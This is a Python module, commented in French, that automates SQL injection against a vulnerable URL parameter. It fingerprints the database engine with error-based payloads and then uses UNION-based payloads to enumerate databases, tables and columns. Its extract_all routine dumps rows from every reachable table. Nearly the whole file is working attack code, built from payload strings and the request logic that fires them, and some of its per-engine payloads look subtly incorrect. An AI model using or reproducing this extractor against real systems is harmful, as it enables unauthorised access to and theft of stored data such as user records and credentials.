#!/usr/bin/env python3
"""
Module d'extraction automatique de données
------------------------------------------
Ce module permet d'extraire automatiquement des données des bases de données
vulnérables aux injections SQL.
"""

import re
import time
import html
from typing import Dict, List, Optional, Set, Tuple, Union
import requests
from bs4 import BeautifulSoup
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.table import Table

console = Console()

class DataExtractor:
    """Classe pour extraire des données à partir d'injections SQL."""
    
    def __init__(self, session, url, param, method="GET", timeout=10, delay=0, 
                 headers=None, cookies=None, proxy=None, verbose=False):
        """
        Initialise l'extracteur de données.
        
        Args:
            session: Session requests à utiliser
            url: URL vulnérable
            param: Paramètre vulnérable
            method: Méthode HTTP (GET ou POST)
            timeout: Timeout des requêtes
            delay: Délai entre les requêtes
            headers: En-têtes HTTP
            cookies: Cookies
            proxy: Proxy à utiliser
            verbose: Mode verbeux
        """
        self.session = session
        self.url = url
        self.param = param
        self.method = method.upper()
        self.timeout = timeout
        self.delay = delay
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.proxy = proxy
        self.verbose = verbose
        
        # Détection du type de base de données
        self.dbms = None
        self.dbms_version = None
        
        # Données extraites
        self.current_db = None
        self.databases = []
        self.tables = {}  # {db_name: [table1, table2, ...]}
        self.columns = {}  # {db_name.table_name: [col1, col2, ...]}
        self.data = {}     # {db_name.table_name.column_name: [val1, val2, ...]}
        
        # Patterns d'erreurs SQL pour différentes bases de données
        self.error_patterns = {
            'mysql': [
                r"SQL syntax.*MySQL", 
                r"Warning.*mysql_.*", 
                r"MySQL Query fail.*",
                r"SQL syntax.*MariaDB server"
            ],
            'postgresql': [
                r"PostgreSQL.*ERROR", 
                r"Warning.*\Wpg_.*", 
                r"Warning.*PostgreSQL"
            ],
            'microsoft': [
                r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}'", 
                r"OLE DB.*SQL Server", 
                r"(\W|\A)SQL Server.*Driver",
                r"Warning.*odbc_.*", 
                r"Warning.*mssql_",
                r"Msg \d+, Level \d+, State \d+",
                r"Unclosed quotation mark after the character string",
                r"Microsoft OLE DB Provider for ODBC Drivers"
            ],
            'oracle': [
                r"ORA-[0-9][0-9][0-9][0-9]", 
                r"Oracle error", 
                r"Warning.*oci_.*",
                r"Microsoft OLE DB Provider for Oracle"
            ],
            'sqlite': [
                r"SQLite/JDBCDriver", 
                r"SQLite\.Exception", 
                r"System\.Data\.SQLite\.SQLiteException"
            ]
        }
    
    def _decode_html_entities(self, text):
        """
        Décode les entités HTML dans une chaîne de caractères.
        
        Args:
            text: Texte contenant des entités HTML
            
        Returns:
            Texte décodé
        """
        if not text:
            return text
            
        # Décodage des entités HTML
        decoded = html.unescape(text)
        
        # Nettoyage supplémentaire pour les caractères spéciaux
        decoded = decoded.replace('\u2013', '-').replace('\u2014', '--')
        decoded = decoded.replace('\u2018', "'").replace('\u2019', "'")
        decoded = decoded.replace('\u201c', '"').replace('\u201d', '"')
        
        return decoded
    
    def _make_request(self, payload):
        """
        Effectue une requête avec le payload injecté.
        
        Args:
            payload: Payload SQL à injecter
            
        Returns:
            Tuple (response, elapsed_time)
        """
        # Ajouter un délai entre les requêtes
        if self.delay > 0:
            time.sleep(self.delay)
            
        # Préparer les paramètres
        if self.method == "GET":
            params = {self.param: payload}
            data = None
        else:  # POST
            params = None
            data = {self.param: payload}
            
        # Effectuer la requête
        start_time = time.time()
        try:
            response = self.session.request(
                method=self.method,
                url=self.url,
                params=params,
                data=data,
                headers=self.headers,
                cookies=self.cookies,
                proxies={"http": self.proxy, "https": self.proxy} if self.proxy else None,
                timeout=self.timeout,
                verify=False
            )
            # Décoder les entités HTML dans la réponse
            if response and hasattr(response, 'text'):
                response._content = self._decode_html_entities(response.text).encode('utf-8')
                
            elapsed = time.time() - start_time
            return response, elapsed
        except Exception as e:
            if self.verbose:
                console.print(f"[bold red]Erreur lors de la requête:[/bold red] {str(e)}")
            return None, time.time() - start_time
    
    def detect_dbms(self):
        """
        Détecte le système de gestion de base de données (DBMS).
        
        Returns:
            Le type de DBMS détecté ou None
        """
        console.print("[bold blue]Détection du système de base de données...[/bold blue]")
        
        # Payloads pour détecter le type de DBMS
        payloads = {
            "mysql": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,VERSION(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '1'='1",
            "postgresql": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,VERSION(),0x7e,FLOOR(RANDOM()*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '1'='1",
            "microsoft": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,@@VERSION,0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '1'='1",
            "oracle": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT banner FROM v$version WHERE ROWNUM=1),0x7e,FLOOR(DBMS_RANDOM.VALUE(0,2)))x FROM dual GROUP BY x)a) AND '1'='1",
            "sqlite": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,sqlite_version(),0x7e,FLOOR(RANDOM()*2))x FROM sqlite_master GROUP BY x)a) AND '1'='1"
        }
        
        # Tester chaque payload
        for dbms, payload in payloads.items():
            response, _ = self._make_request(payload)
            if response:
                # Vérifier les patterns d'erreurs
                for pattern in self.error_patterns.get(dbms, []):
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self.dbms = dbms
                        
                        # Essayer d'extraire la version
                        version_match = re.search(r'~([^~]+)~', response.text)
                        if version_match:
                            self.dbms_version = version_match.group(1)
                        
                        console.print(f"[bold green]DBMS détecté:[/bold green] {dbms.upper()}")
                        if self.dbms_version:
                            console.print(f"[bold green]Version:[/bold green] {self.dbms_version}")
                        return dbms
        
        # Méthode alternative: tester des fonctions spécifiques à chaque DBMS
        alternative_payloads = {
            "mysql": "' OR ORD(MID(VERSION(),1,1))>0 AND '1'='1",
            "postgresql": "' OR ASCII(SUBSTRING(VERSION(),1,1))>0 AND '1'='1",
            "microsoft": "' OR ASCII(SUBSTRING(@@VERSION,1,1))>0 AND '1'='1",
            "oracle": "' OR ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))>0 AND '1'='1",
            "sqlite": "' OR UNICODE(SUBSTR(sqlite_version(),1,1))>0 AND '1'='1"
        }
        
        for dbms, payload in alternative_payloads.items():
            response, _ = self._make_request(payload)
            if response and "error" not in response.text.lower():
                self.dbms = dbms
                console.print(f"[bold green]DBMS détecté (méthode alternative):[/bold green] {dbms.upper()}")
                return dbms
        
        console.print("[bold yellow]DBMS non détecté. Supposons MySQL par défaut.[/bold yellow]")
        self.dbms = "mysql"
        return "mysql"
    
    def get_current_database(self):
        """
        Récupère le nom de la base de données courante.
        
        Returns:
            Nom de la base de données courante ou None
        """
        if not self.dbms:
            self.detect_dbms()
            
        console.print("[bold blue]Récupération de la base de données courante...[/bold blue]")
        
        # Payloads spécifiques à chaque DBMS
        payloads = {
            "mysql": "' UNION SELECT CONCAT('DBNAME:',database()),'2' -- -",
            "postgresql": "' UNION SELECT CONCAT('DBNAME:',current_database()),'2' -- -",
            "microsoft": "' UNION SELECT CONCAT('DBNAME:',DB_NAME()),'2' -- -",
            "oracle": "' UNION SELECT CONCAT('DBNAME:',SYS.DATABASE_NAME),'2' FROM DUAL -- -",
            "sqlite": "' UNION SELECT CONCAT('DBNAME:','main'),'2' -- -"  # SQLite utilise 'main' par défaut
        }
        
        payload = payloads.get(self.dbms, payloads["mysql"])
        response, _ = self._make_request(payload)
        
        if response:
            # Chercher le pattern DBNAME:xxx
            match = re.search(r'DBNAME:([^<>"\']+)', response.text)
            if match:
                self.current_db = match.group(1)
                console.print(f"[bold green]Base de données courante:[/bold green] {self.current_db}")
                return self.current_db
        
        console.print("[bold yellow]Impossible de récupérer la base de données courante.[/bold yellow]")
        return None
    
    def get_databases(self):
        """
        Récupère la liste des bases de données.
        
        Returns:
            Liste des bases de données ou liste vide
        """
        if not self.dbms:
            self.detect_dbms()
            
        console.print("[bold blue]Récupération des bases de données...[/bold blue]")
        
        # Payloads spécifiques à chaque DBMS
        payloads = {
            "mysql": "' UNION SELECT CONCAT('DB:',schema_name),'2' FROM information_schema.schemata -- -",
            "postgresql": "' UNION SELECT CONCAT('DB:',datname),'2' FROM pg_database -- -",
            "microsoft": "' UNION SELECT CONCAT('DB:',name),'2' FROM master.dbo.sysdatabases -- -",
            "oracle": "' UNION SELECT CONCAT('DB:',owner),'2' FROM all_tables -- -",
            "sqlite": "' UNION SELECT CONCAT('DB:','main'),'2' -- -"  # SQLite n'a qu'une base de données par fichier
        }
        
        payload = payloads.get(self.dbms, payloads["mysql"])
        response, _ = self._make_request(payload)
        
        if response:
            # Chercher tous les patterns DB:xxx
            matches = re.findall(r'DB:([^<>"\']+)', response.text)
            if matches:
                self.databases = list(set(matches))  # Éliminer les doublons
                
                # Afficher les bases de données
                table = Table(title="Bases de données")
                table.add_column("Nom", style="cyan")
                
                for db in sorted(self.databases):
                    table.add_row(db)
                
                console.print(table)
                return self.databases
        
        console.print("[bold yellow]Impossible de récupérer les bases de données.[/bold yellow]")
        return []
    
    def get_tables(self, database=None):
        """
        Récupère la liste des tables d'une base de données.
        
        Args:
            database: Base de données cible (utilise la courante si None)
            
        Returns:
            Liste des tables ou liste vide
        """
        if not self.dbms:
            self.detect_dbms()
            
        if not database:
            if not self.current_db:
                self.get_current_database()
            database = self.current_db
            
        if not database:
            console.print("[bold red]Aucune base de données spécifiée.[/bold red]")
            return []
            
        console.print(f"[bold blue]Récupération des tables de la base de données [cyan]{database}[/cyan]...[/bold blue]")
        
        # Payloads spécifiques à chaque DBMS
        payloads = {
            "mysql": f"' UNION SELECT CONCAT('TABLE:',table_name),'2' FROM information_schema.tables WHERE table_schema='{database}' -- -",
            "postgresql": f"' UNION SELECT CONCAT('TABLE:',tablename),'2' FROM pg_tables WHERE schemaname='{database}' -- -",
            "microsoft": f"' UNION SELECT CONCAT('TABLE:',name),'2' FROM {database}..sysobjects WHERE xtype='U' -- -",
            "oracle": f"' UNION SELECT CONCAT('TABLE:',table_name),'2' FROM all_tables WHERE owner='{database}' -- -",
            "sqlite": "' UNION SELECT CONCAT('TABLE:',name),'2' FROM sqlite_master WHERE type='table' -- -"
        }
        
        payload = payloads.get(self.dbms, payloads["mysql"])
        response, _ = self._make_request(payload)
        
        if response:
            # Chercher tous les patterns TABLE:xxx
            matches = re.findall(r'TABLE:([^<>"\']+)', response.text)
            if matches:
                tables = list(set(matches))  # Éliminer les doublons
                self.tables[database] = tables
                
                # Afficher les tables
                table = Table(title=f"Tables de {database}")
                table.add_column("Nom", style="cyan")
                
                for t in sorted(tables):
                    table.add_row(t)
                
                console.print(table)
                return tables
        
        console.print(f"[bold yellow]Impossible de récupérer les tables de {database}.[/bold yellow]")
        return []
    
    def get_columns(self, table, database=None):
        """
        Récupère la liste des colonnes d'une table.
        
        Args:
            table: Table cible
            database: Base de données cible (utilise la courante si None)
            
        Returns:
            Liste des colonnes ou liste vide
        """
        if not self.dbms:
            self.detect_dbms()
            
        if not database:
            if not self.current_db:
                self.get_current_database()
            database = self.current_db
            
        if not database or not table:
            console.print("[bold red]Base de données ou table non spécifiée.[/bold red]")
            return []
            
        console.print(f"[bold blue]Récupération des colonnes de la table [cyan]{database}.{table}[/cyan]...[/bold blue]")
        
        # Payloads spécifiques à chaque DBMS
        payloads = {
            "mysql": f"' UNION SELECT CONCAT('COLUMN:',column_name),'2' FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' -- -",
            "postgresql": f"' UNION SELECT CONCAT('COLUMN:',column_name),'2' FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' -- -",
            "microsoft": f"' UNION SELECT CONCAT('COLUMN:',name),'2' FROM syscolumns WHERE id=OBJECT_ID('{database}..{table}') -- -",
            "oracle": f"' UNION SELECT CONCAT('COLUMN:',column_name),'2' FROM all_tab_columns WHERE owner='{database}' AND table_name='{table}' -- -",
            "sqlite": f"' UNION SELECT CONCAT('COLUMN:',name),'2' FROM pragma_table_info('{table}') -- -"
        }
        
        payload = payloads.get(self.dbms, payloads["mysql"])
        response, _ = self._make_request(payload)
        
        if response:
            # Chercher tous les patterns COLUMN:xxx
            matches = re.findall(r'COLUMN:([^<>"\']+)', response.text)
            if matches:
                columns = list(set(matches))  # Éliminer les doublons
                key = f"{database}.{table}"
                self.columns[key] = columns
                
                # Afficher les colonnes
                table_ui = Table(title=f"Colonnes de {database}.{table}")
                table_ui.add_column("Nom", style="cyan")
                
                for col in sorted(columns):
                    table_ui.add_row(col)
                
                console.print(table_ui)
                return columns
        
        console.print(f"[bold yellow]Impossible de récupérer les colonnes de {database}.{table}.[/bold yellow]")
        return []
    
    def dump_data(self, table, columns=None, database=None, limit=100):
        """
        Extrait les données d'une table.
        
        Args:
            table: Table cible
            columns: Liste des colonnes à extraire (toutes si None)
            database: Base de données cible (utilise la courante si None)
            limit: Nombre maximum de lignes à extraire
            
        Returns:
            Liste des données extraites ou liste vide
        """
        if not self.dbms:
            self.detect_dbms()
            
        if not database:
            if not self.current_db:
                self.get_current_database()
            database = self.current_db
            
        if not database or not table:
            console.print("[bold red]Base de données ou table non spécifiée.[/bold red]")
            return []
            
        # Si aucune colonne n'est spécifiée, récupérer toutes les colonnes
        if not columns:
            key = f"{database}.{table}"
            if key not in self.columns:
                columns = self.get_columns(table, database)
            else:
                columns = self.columns[key]
                
        if not columns:
            console.print("[bold red]Aucune colonne disponible.[/bold red]")
            return []
            
        console.print(f"[bold blue]Extraction des données de [cyan]{database}.{table}[/cyan]...[/bold blue]")
        
        # Construire la liste des colonnes pour la requête
        column_list = ",".join(columns)
        
        # Payloads spécifiques à chaque DBMS
        payloads = {
            "mysql": f"' UNION SELECT CONCAT('ROW:',CONCAT_WS('|',{column_list})),'2' FROM {database}.{table} LIMIT {limit} -- -",
            "postgresql": f"' UNION SELECT CONCAT('ROW:',CONCAT_WS('|',{column_list})),'2' FROM {database}.{table} LIMIT {limit} -- -",
            "microsoft": f"' UNION SELECT CONCAT('ROW:',{'+' + '|' + '+'.join(columns)}),'2' FROM {database}..{table} WHERE ROWNUM <= {limit} -- -",
            "oracle": f"' UNION SELECT CONCAT('ROW:',{column_list}),'2' FROM {database}.{table} WHERE ROWNUM <= {limit} -- -",
            "sqlite": f"' UNION SELECT CONCAT('ROW:',{column_list}),'2' FROM {table} LIMIT {limit} -- -"
        }
        
        payload = payloads.get(self.dbms, payloads["mysql"])
        response, _ = self._make_request(payload)
        
        if response:
            # Chercher tous les patterns ROW:xxx
            matches = re.findall(r'ROW:([^<>"\']+)', response.text)
            if matches:
                # Traiter les données
                data = []
                for row in matches:
                    values = row.split('|')
                    if len(values) == len(columns):
                        data.append(dict(zip(columns, values)))
                
                # Stocker les données
                key = f"{database}.{table}"
                self.data[key] = data
                
                # Afficher les données
                table_ui = Table(title=f"Données de {database}.{table} (max {limit} lignes)")
                
                # Ajouter les colonnes
                for col in columns:
                    table_ui.add_column(col, style="cyan")
                
                # Ajouter les lignes
                for row_data in data:
                    table_ui.add_row(*[str(row_data.get(col, '')) for col in columns])
                
                console.print(table_ui)
                return data
        
        console.print(f"[bold yellow]Impossible d'extraire les données de {database}.{table}.[/bold yellow]")
        return []
    
    def extract_all(self, max_tables=5, max_rows=100):
        """
        Extrait toutes les données accessibles.
        
        Args:
            max_tables: Nombre maximum de tables à extraire par base de données
            max_rows: Nombre maximum de lignes à extraire par table
            
        Returns:
            Dictionnaire des données extraites
        """
        # Détecter le DBMS
        self.detect_dbms()
        
        # Récupérer la base de données courante
        self.get_current_database()
        
        # Récupérer toutes les bases de données
        databases = self.get_databases()
        
        # Pour chaque base de données
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
        ) as progress:
            db_task = progress.add_task("[cyan]Extraction des bases de données...", total=len(databases))
            
            for db in databases:
                progress.update(db_task, description=f"[cyan]Base de données: {db}")
                
                # Récupérer les tables
                tables = self.get_tables(db)
                
                # Limiter le nombre de tables
                if len(tables) > max_tables:
                    console.print(f"[bold yellow]Limitation à {max_tables} tables sur {len(tables)}.[/bold yellow]")
                    tables = tables[:max_tables]
                
                table_task = progress.add_task(f"[green]Tables de {db}...", total=len(tables))
                
                # Pour chaque table
                for table in tables:
                    progress.update(table_task, description=f"[green]Table: {table}")
                    
                    # Récupérer les colonnes
                    columns = self.get_columns(table, db)
                    
                    # Extraire les données
                    self.dump_data(table, columns, db, max_rows)
                    
                    progress.advance(table_task)
                
                progress.update(table_task, completed=True)
                progress.advance(db_task)
            
            progress.update(db_task, completed=True)
        
        return self.data
